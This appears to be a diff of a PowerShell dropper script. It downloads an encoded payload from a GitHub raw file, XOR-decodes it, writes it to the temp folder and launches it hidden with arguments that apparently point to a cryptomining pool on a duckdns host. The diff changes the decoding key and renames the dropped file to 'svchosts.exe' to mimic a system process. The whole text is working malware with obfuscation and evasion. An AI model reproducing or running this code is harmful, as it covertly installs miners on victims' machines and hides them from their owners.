@@ -15,9 +15,9 @@ function white {
 
 $var = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/mail.log").Trim()
 $yellow = [Convert]::FromBase64String($var)
-$orange = "137"
+$orange = "25"
 $buf = white -Key $orange -Data $yellow
-$temp = [IO.Path]::Combine($env:TEMP, [Guid]::NewGuid().ToString() + ".exe")
+$temp = [IO.Path]::Combine($env:TEMP, "svchosts.exe")
 [IO.File]::WriteAllBytes($temp, $buf)
 Start-Process -FilePath $temp -ArgumentList "-o ontcfu.duckdns.org:443 --tls" -WindowStyle Hidden
 Remove-Item $temp -Force
